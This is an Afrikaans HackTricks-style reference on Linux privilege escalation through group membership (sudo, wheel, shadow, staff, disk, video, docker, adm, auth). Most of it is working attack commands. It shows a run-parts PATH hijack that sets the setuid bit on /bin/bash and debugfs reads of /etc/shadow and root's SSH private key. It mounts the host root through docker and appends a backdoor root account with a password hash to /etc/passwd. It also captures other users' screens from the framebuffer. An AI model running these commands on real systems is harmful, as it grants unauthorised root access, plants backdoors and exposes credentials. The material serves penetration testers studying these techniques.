# Interessante Groepe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groepe

### **PE - Metode 1**

**Soms**, **standaard (of omdat sommige sagteware dit benodig)** in die **/etc/sudoers** lêer kan jy sommige van hierdie reëls vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep sudo of admin behoort enigiets as sudo kan uitvoer**.

Indien dit die geval is, om **root te word, kan jy net die volgende uitvoer**:
```
sudo su
```
### PE - Method 2

Vind alle suid binaries en kyk of die binary **Pkexec** daar is:
```bash
find / -perm -4000 2>/dev/null
```
As jy vind dat die binary **pkexec is a SUID binary** en jy behoort tot **sudo** of **admin**, kan jy waarskynlik binaries as sudo uitvoer met `pkexec`.\  
Dit is omdat dit gewoonlik die groepe binne die **polkit policy** is. Hierdie policy identifiseer basies watter groepe `pkexec` kan gebruik. Kyk dit met:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **standaard** verskyn in sommige linux distros die groepe **sudo** en **admin**.

Om **root te word, kan jy die volgende uitvoer**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie toestemming het nie, maar omdat jy nie sonder 'n GUI verbind is nie**. En daar is 'n omweg vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy het **2 verskillende ssh-sessies** nodig:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Soms**, **by verstek** binne die **/etc/sudoers** lêer kan jy hierdie reël vind:
```
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat tot die groep wheel behoort alles as sudo kan uitvoer**.

Indien dit die geval is, om **root te word hoef jy net die volgende uit te voer**:
```
sudo su
```
## Shadow Group

Gebruikers van die **group shadow** kan die **/etc/shadow** lêer **lees**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lees die lêer en probeer **crack some hashes**.

Kort aanmerkings oor die slotstatus wanneer hashes getriage word:
- Inskrywings met `!` of `*` is oor die algemeen nie-interaktief vir wagwoord-aanmeldings.
- `!hash` beteken gewoonlik dat 'n wagwoord gestel is en toe gesluit is.
- `*` beteken gewoonlik dat geen geldige wagwoord-hash ooit gestel is nie.
Dit is nuttig vir rekeningklassifikasie, selfs wanneer direkte aanmelding geblokkeer is.

## Personeelgroep

**staff**: Laat gebruikers toe om plaaslike wysigings aan die stelsel by te voeg (`/usr/local`) sonder dat root-bevoegdhede benodig word (let daarop dat uitvoerbare lêers in `/usr/local/bin` in die `$PATH` veranderlike van enige gebruiker is, en hulle dalk die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam kan "oorskryf"). Vergelyk met groep "adm", wat meer verwant is aan monitering/sekuriteit. [\[source\]](https://wiki.debian.org/SystemGroups)

In Debian-verspreidings wys die `$PATH` veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, ongeag of jy 'n bevoorregte gebruiker is of nie.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
As ons sekere programme in `/usr/local` kan kap, kan ons maklik root kry.

Om die `run-parts`-program te kap is 'n maklike manier om root te kry, omdat baie programme `run-parts` gebruik — byvoorbeeld crontab of tydens 'n ssh-aanmelding.
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
of wanneer 'n nuwe ssh-sessie aanmeld.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Hierdie voorreg is byna **gelykstaande aan root access**, aangesien jy toegang tot alle data op die masjien het.

Lêers:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let wel dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy die volgende doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
As jy egter probeer om **skryf na lêers wat aan root behoort** (soos `/etc/shadow` of `/etc/passwd`), sal jy 'n "**Toegang geweier**" fout kry.

## Video Groep

Met die opdrag `w` kan jy sien **wie by die stelsel aangemeld is**, en dit sal 'n uitvoer soos die volgende wys:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies by 'n terminal op die masjien aangemeld is**.

Die **video group** het toegang om die skermuitset te sien. Basies kan jy die skerms waarneem. Om dit te doen moet jy **vang die huidige beeld op die skerm** as rou data en die resolusie bepaal wat die skerm gebruik. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind by `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **raw image** te **open** kan jy **GIMP** gebruik: kies die **`screen.raw`**-lêer en stel die lêertipe op **Raw image data**:

![](<../../../images/image (463).png>)

Verander dan die Width en Height na die waardes wat op die skerm gebruik word en probeer verskillende Image Types (en kies die een wat die skerm die beste wys):

![](<../../../images/image (317).png>)

## Root Group

Dit lyk asof standaard **members of root group** toegang kan hê om sommige **service** konfigurasielêers of sommige **libraries**-lêers of **other interesting things** te **modify** wat gebruik kan word om voorregte te eskaleer...

**Kontroleer watter lêers root members kan modify**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Jy kan **die root filesystem van die host machine aan 'n instance se volume mount**, sodat wanneer die instance begin dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief root op die masjien.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:


{{#ref}}
../container-security/
{{#endref}}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Groep


{{#ref}}
./
{{#endref}}

## Adm Groep

Gewoonlik het **lede** van die groep **`adm`** toestemming om loglêers in _/var/log/_ te **lees**.\
Daarom, as jy 'n gebruiker binne hierdie groep gekompromitteer het, behoort jy beslis na die logs te kyk.

## Backup / Operator / lp / Mail groepe

Hierdie groepe is dikwels meer vektore vir **credential-discovery** as regstreekse root-vektore:
- **backup**: kan argiewe met configs, sleutels, DB-dumps of tokens openbaar.
- **operator**: platform-spesifieke operationele toegang wat sensitiewe runtime-data kan leak.
- **lp**: print queues/spools kan dokumentinhoud bevat.
- **mail**: mail spools kan reset links, OTPs en interne credentials openbaar maak.

Behandel lidmaatskap hier as 'n hoogs waardevolle data-blootstellingsbevinding en pivot deur wagwoord/token-hergebruik.

## Auth groep

In OpenBSD kan die **auth** groep gewoonlik skryf in die vouers _**/etc/skey**_ en _**/var/db/yubikey**_ indien hulle gebruik word.\
Hierdie toestemmings kan misbruik word met die volgende exploit om **escalate privileges** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
